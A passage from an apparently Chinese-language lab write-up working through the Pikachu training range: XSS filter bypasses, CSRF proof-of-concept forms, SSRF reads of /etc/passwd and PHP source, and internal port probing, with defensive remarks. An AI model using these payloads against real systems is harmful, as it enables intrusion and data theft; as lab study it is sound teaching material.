name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;请说出你的伤心往事&quot;/&gt;</span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>首先定义一个domxss函数：</p>
<p>利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str</p>
<p>然后经过URL解码和字符串分隔，取出URL中的参数内容；</p>
<p>把 “+” 替换为 “ ”（空格），赋值给 xss；</p>
<p>把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中。</p>
<p>与之前DOM不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)</p>
<p>构造的Payload同上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p>为攻击场景，输入的内容不会在当前输出，而是提交到后台。若输入一串js，管理员登录后台管理界面，后台会输出我们提交的内容</p>
<p>输入常见xss一句话，登陆管理员界面即可看到一登陆进来就遭受攻击。</p>
<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>常见xss一句话输入，被后台过滤，大小写即可绕过。也可用&lt;img src=x onerror=alert(‘xss’)&gt;。</p>
<p>实际场景中，或多或少都会有过滤，但是有些逻辑不严谨，也可被绕过。</p>
<p>绕过思路：</p>
<ul>
<li><strong>前端限制绕过</strong>：直接抓包重放，或修改html前端代码。如反射型XSS(get)中限制输入20个字符。</li>
<li><strong>大小写</strong>：比如<SCRIPT>aLeRT(111)。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。</SCRIPT></li>
<li><strong>双写</strong>：&lt;scri<script>pt>alert(111)</scri</script>pt&gt;。针对后台把<script>标签去掉换，但可能只去掉一次。</li>
<li><strong>注释干扰</strong>：&lt;scri<!--test-->pt&gt;alert(111)&lt;/sc<!--test-->ript&gt;。加上注释后可能可以绕过后台过滤机制。</li>
<li><strong>编码</strong>：后台过滤特殊字符，如<script>标签，但该标签可被各种编码，或许可以绕过。(浏览器会对某些编码进行识别，翻译成正常的标签执行)</li>
</ul>
<blockquote>
<h5 id="浏览器的解码顺序："><a href="#浏览器的解码顺序：" class="headerlink" title="浏览器的解码顺序："></a><strong>浏览器的解码顺序：</strong></h5><p>浏览器的解码顺序和解析顺序不同。浏览器一般的解码顺序是：html解码–&gt;javascript解码–&gt;浏览器的url解码.</p>
<p>这里的url解码和发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</p>
</blockquote>
<p> <strong>属性标签不会正常解析URL编码，因此不会执行</strong></p>
<blockquote>
<p>&lt;img src=x onerror=alert(‘xss’)&gt;</p>
<p>将alert(‘xss’)进行URL编码，可以执行吗？</p>
<img src=x onerror=alert%28%27xss%27%29>
</blockquote>
<p><strong>HTML编码可以被浏览器解析，因此会执行</strong></p>
<blockquote>
<p>&lt;img src=x onerror=alert(‘xss’)&gt;将alert(‘xss’)进行HTML编码<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;></p>
</blockquote>
<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>htmlspecialchars()：<strong>对特殊字符进行转义</strong></p>
<p>  预定义字符包括：</p>
<ul>
<li><p>&amp; 成为 &amp;amp</p>
</li>
<li><p>“ 成为 &amp;quot</p>
</li>
<li><p>‘ 成为 &amp;#039</p>
</li>
<li><p>&lt; 成为 &amp;lt</p>
</li>
<li><p>&gt; 成为 &amp;gt</p>
<p>可用引号类型</p>
</li>
<li><p>ENT_COMPAT：默认，仅编码双引号</p>
</li>
<li><p>ENT_QUOTES：编码双引号和单引号</p>
</li>
<li><p>ENT_NOQUOTES：不编码任何引号</p>
</li>
</ul>
<blockquote>
<p>默认：对输入直接进行过滤。</p>
<p>建议用ENT_QUOTES,对单双引号都进行过滤</p>
</blockquote>
<p>测试，查看htmlspecialchars是否过滤单双引号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&#39;&quot;&lt;&gt;&amp;</span><br></pre></td></tr></table></figure>

<p><img src="4.png"></p>
<p>可以对于单引号未进行编码，因此构造Payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>

<p>审计后端代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;输入点啥吧！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#x27;处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;你的输入已经被记录:&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//输入的内容被处理后输出到了input标签的value属性里面,试试:&#x27; onclick=&#x27;alert(111)&#x27;</span></span><br><span class="line"><span class="comment">//        $html2.=&quot;&lt;input class=&#x27;input&#x27; type=&#x27;text&#x27; name=&#x27;inputvalue&#x27; readonly=&#x27;readonly&#x27; value=&#x27;&#123;$message&#125;&#x27; style=&#x27;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&#x27;/&gt;&quot;;</span></span><br><span class="line">        <span class="variable">$html2</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt;<span class="subst">&#123;$message&#125;</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于htmlspecialchars默认不处理’，导致可以绕过。</p>
<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>先来看看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$message=htmlspecialchars($_GET[‘message’],ENT_QUOTES) htmlspecialchars使用ENT_QUOTES，过滤掉单双引号，然后将输入放入a标签的href属性中。a标签的href属性可用javascript协议来执行js。这时候就利用js构造payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>思考:</p>
<p>a标签的href属性如果有输出，如何做防范措施呢？</p>
<p>首先仅仅用htmlspecialchars做过滤是不够的。一般有两个逻辑： href用来插入链接，所以我们<strong>首先只允许http,https开头的协议，再进行htmlspecialchars过滤</strong>。</p>
<h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>随便输入111，查看网页源码可以发现，输入被放入js中进行判断后输出。</p>
<p>其实<strong>js的payload就是构造闭合</strong>，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="comment">//在这构造：$ms=&#x27;1&#x27;&lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;&#x27;;</span></span><br><span class="line">    <span class="keyword">if</span>($ms.length != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>后台源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这里讲输入动态的生成到了js中,形成xss</span><br><span class="line">&#x2F;&#x2F;javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修?</span><br><span class="line">&#x2F;&#x2F;这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。</span><br><span class="line">&#x2F;&#x2F;所以在JS的输出点应该使用\对特殊字符进行转义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;message&#39;] !&#x3D;null)&#123;</span><br><span class="line">    $jsvar&#x3D;$_GET[&#39;message&#39;];</span><br><span class="line">&#x2F;&#x2F;    $jsvar&#x3D;htmlspecialchars($_GET[&#39;message&#39;],ENT_QUOTES);</span><br><span class="line">    if($jsvar &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">        $html.&#x3D;&quot;&lt;img src&#x3D;&#39;&#123;$PIKA_ROOT_DIR&#125;assets&#x2F;images&#x2F;nbaplayer&#x2F;tmac.jpeg&#39; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $ms&#x3D;&#39;&lt;?php echo $jsvar;?&gt;&#39;;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>前端接收，后端通过js接收参数。输出点在js中，通过用户输入动态生成了js代码。使用htmlspecialchars做过滤时，输入会被html实体编码，而js不能再反转化回去。所以<strong>用\在JS中对特殊字符进行转义</strong>。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1516371">https://cloud.tencent.com/developer/article/1516371</a></p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>攻击者会伪造一个请求链接，然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。</p>
<p>判断一个网站是否存在CSRF漏洞，其实就是<strong>判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造</strong>。</p>
<p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
<p>网站如果要防止CSRF攻击，需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
<h2 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h2><p>在修改个人信息处，可以看到URL以明文的形式传输，攻击者可以伪造URL诱骗用户点击来实现攻击。此处我们伪造URL将目标用户的邮箱修改为我们的邮箱。若用户在登陆的状态下点击此伪造的URL，可更改个人信息。伪造的URL如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.137.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;18626545454&amp;add&#x3D;Earth&amp;email&#x3D;&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>burp抓包也可以更改：</p>
<p><img src="5.png"></p>
<h2 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h2><p>此时无法像前面一样通过伪造URL来进行攻击，我们可以通过构造恶意站点，将POST请求隐藏在站点中的表单中，然后诱骗用户进行点击，当用户点击后触发表单，数据自然就POST到存在CSRF漏洞的网站，用户的信息则被恶意修改。</p>
<p>burp拦截请求，并生成恶意的网页index.html</p>
<p><img src="12.jpg"></p>
<p>html源码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;192.168.137.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfpost&#x2F;csrf_post_edit.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;boy&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;phonenum&quot; value&#x3D;&quot;18626545453&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;add&quot; value&#x3D;&quot;Earth&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;hacher&amp;#64;pikachu&amp;#46;com&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;you have been hacked&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></table></figure>

<p>当用户在<strong>登录状态</strong>下，访问我们伪造的站点<code>http://192.168.137.1/pikachu/vul/csrf/index.html</code>并点击提交按钮，那么其个人信息将会被恶意修改.</p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>在修改个人信息处，添加信息，提交信息，Burp拦截之后可发现，修改信息时会<strong>添加token信息</strong>，以防止CSRF:<br><img src="13.jpg"></p>
<p>CSRF的主要问题是敏感操作的链接容易被伪造。而只要在每次请求时都增加一个随机码<code>Token</code>，后台每次都对这个随机码进行验证，则可以有效地防止CSRF</p>
<h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><p>SSRF形成的原因大都是<strong>由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</strong>，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>数据流: 攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>根据后台使用函数的不同,影响和利用方法也不一样</p>
<p>PHP中以下函数使用不当会导致SSRF:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<p>若一定要通过后台服务器远程对用户指定地址进行资源请求,一定要做好目标地址的过滤。</p>
<h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><p>点击累了来读一首诗吧，可看到URL中传了一个url参数。</p>
<p>查看后端源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = curl_init(<span class="variable">$URL</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = curl_exec(<span class="variable">$CH</span>);</span><br><span class="line">    curl_close(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了httptps外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从前端获取了url请求，curl_init函数会对它进行初始化，然后curl_exec函数执行请求，最终又将请求结果返回到前端。</p>
<p>用百度试一下，可以发现页面显示百度的数据库，说明我们分析正确，前端传入参数，后端通过<strong>curl_exec</strong>去请求百度，最后把请求返回的百度数据返回到前端。<br><img src="6.png"></p>
<p>在test目录下新建一个1.txt，load1.txt文件的地址，可以看到页面加载了1.txt的内容。</p>
<p><img src="7.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;192.168.137.17:22</span><br></pre></td></tr></table></figure>

<p>将url改成内网上的其他主机(http协议)，就可以探测到内网的其他主机ssh等服务端口是否开放。</p>
<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><p>与前面相同，都是通过URL上传参数到后台获取信息：</p>
<p>后端代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span></span><br><span class="line"><span class="comment">//内网请求:http://x.x.x.x/xx.index</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$str</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>file_get_contents()：把整个文件读入一个字符串中</p>
<p>此处使用<strong>file_get_contents</strong>函数进行文件的读取执行，<strong>file_get_contents</strong>函数可以对本地文件进行读取，也可以对远程文件进行读取。</p>
<p>当我们按照之前测试百度和1.txt都会成功。</p>
<p>漏洞利用：</p>
<ol>
<li><p>文件读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></li>
<li><p>读取php源码的base64加密版本，之后解密即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;ssrf.php</span><br></pre></td></tr></table></figure></li>
<li><p>内网其他主机的请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100&#x2F;index.html</span><br></pre></td></tr></table></figure></li>
<li><p>探测内网其他主机的端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100:22</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE ：xml external entity injection，xml外部实体注入漏洞<br>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,即<strong>服务端接收和解析了来自用户端的xml数据</strong>,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>目前多种语言解析xml的函数默认禁止解析外部实体内容的,从而直接避免这个漏洞。</p>
<p>第一部分：XML声明部分</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二部分：文档类型定义 DTD</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">entity-name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI/URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三部分：文档元素</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。</p>
<p>① 内部申明DTD格式<!DOCTYPE 根元素 [元素申明]></p>
